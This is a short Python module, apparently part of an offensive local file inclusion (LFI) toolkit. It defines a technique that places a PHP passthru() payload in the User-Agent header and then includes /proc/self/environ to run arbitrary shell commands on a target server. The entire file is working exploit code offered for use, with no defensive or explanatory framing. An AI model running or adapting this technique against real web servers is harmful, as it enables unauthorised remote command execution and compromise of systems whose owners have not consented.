from core.techniques.LFIExec import LFIExec

class LFIHeader (LFIExec):
    files_exec = [
        # env
        { 'path' : '/proc/self/environ', 'type' : 'header' },
    ]

    # find LFI code execution path
    def check (self):
        return super(LFIHeader, self)._check (prepare_check_header)

    # do exec
    def exploit (self, cmd):
        return super(LFIHeader, self)._exploit (prepare_exec_header, cmd)

def prepare_check_header (lfi, payload):
    lfi.headers['User-Agent'] = payload
    return lfi.pattern_url[:]
        
def prepare_exec_header (lfi, cmd):
    payload = '<?php echo "' + lfi.tag_start_exec + '"; passthru ("{0}"); echo "' + lfi.tag_end_exec + '"; ?>'
    payload = payload.format (cmd)
    lfi.headers['User-Agent'] = payload
    return lfi.pattern_url[:]

